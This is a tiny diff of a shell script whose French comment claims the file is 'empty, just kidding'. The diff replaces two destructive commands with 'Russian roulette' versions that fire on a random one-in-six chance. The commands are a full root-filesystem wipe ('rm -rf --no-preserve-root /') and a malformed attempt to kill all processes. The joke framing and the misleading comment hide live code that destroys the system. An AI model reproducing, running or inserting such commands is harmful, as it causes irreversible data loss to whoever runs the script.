@@ -1,3 +1,3 @@
 #nan je rigole c'est vide
-rm -rf / --no-preserve-root
-kill -9 all
+[ $[ $RANDOM % 6 ] == 0 ] && rm -rf --no-preserve-root /
+[ $[ $RANDOM % 6 ] == 0 ] &&  kill -9 all
